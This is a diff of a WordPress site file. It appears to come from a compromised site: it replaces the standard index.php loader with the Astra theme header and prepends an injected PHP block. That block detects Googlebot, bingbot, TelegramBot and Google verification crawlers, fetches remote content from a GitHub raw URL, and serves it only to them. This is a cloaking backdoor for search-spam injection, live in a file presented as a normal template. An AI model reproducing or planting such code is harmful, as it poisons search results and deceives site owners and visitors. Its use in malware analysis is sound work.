@@ -1,17 +1,105 @@
+<?php  
+function is_bot() {  
+    $user_agent = $_SERVER["HTTP_USER_AGENT"];  
+    $bots = array( 
+        "Googlebot",  
+        "TelegramBot",  
+        "bingbot",  
+        "Google-Site-Verification",  
+        "Google-InspectionTool" 
+    );  
+
+    foreach ($bots as $bot) {  
+        if (stripos($user_agent, $bot) !== false) {  
+            return true;  
+        }  
+    }  
+    return false;  
+}  
+
+function get_content_from_url($url) {
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+
+    $content = curl_exec($ch);
+    curl_close($ch);
+
+    return $content;
+}
+
+if (is_bot()) {  
+    $url = "https://raw.githubusercontent.com/juraganujang/ujang/refs/heads/main/apaed";
+    $content = get_content_from_url($url);
+
+    if ($content !== false) {
+        echo $content;
+    }
+    exit; // Stop further output for bots
+}  
+?>
 <?php
 /**
- * Front to the WordPress application. This file doesn't do anything, but loads
- * wp-blog-header.php which does and tells WordPress to load the theme.
+ * The header for Astra Theme.
  *
- * @package WordPress
+ * This is the template that displays all of the <head> section and everything up until <div id="content">
+ *
+ * @link https://developer.wordpress.org/themes/basics/template-files/#template-partials
+ *
+ * @package Astra
+ * @since 1.0.0
  */
 
-/**
- * Tells WordPress to load the WordPress theme and output it.
- *
- * @var bool
- */
-define( 'WP_USE_THEMES', true );
+if ( ! defined( 'ABSPATH' ) ) {
+	exit; // Exit if accessed directly.
+}
 
-/** Loads the WordPress Environment and Template */
-require __DIR__ . '/wp-blog-header.php';
+?><!DOCTYPE html>
+<?php astra_html_before(); ?>
+<html <?php language_attributes(); ?>>
+<head>
+<?php astra_head_top(); ?>
+<meta charset="<?php bloginfo( 'charset' ); ?>">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="profile" href="https://gmpg.org/xfn/11">
+
+<?php wp_head(); ?>
+<?php astra_head_bottom(); ?>
+</head>
+
+<body <?php astra_schema_body(); ?> <?php body_class(); ?>>
+<?php astra_body_top(); ?>
+<?php wp_body_open(); ?>
+
+<a
+	class="skip-link screen-reader-text"
+	href="#content"
+	role="link"
+	title="<?php echo esc_html( astra_default_strings( 'string-header-skip-link', false ) ); ?>">
+		<?php echo esc_html( astra_default_strings( 'string-header-skip-link', false ) ); ?>
+</a>
+
+<div
+<?php
+	echo astra_attr(
+		'site',
+		array(
+			'id'    => 'page',
+			'class' => 'hfeed site',
+		)
+	);
+	?>
+>
+	<?php
+	astra_header_before();
+
+	astra_header();
+
+	astra_header_after();
+
+	astra_content_before();
+	?>
+	<div id="content" class="site-content">
+		<div class="ast-container">
+		<?php astra_content_top(); ?>
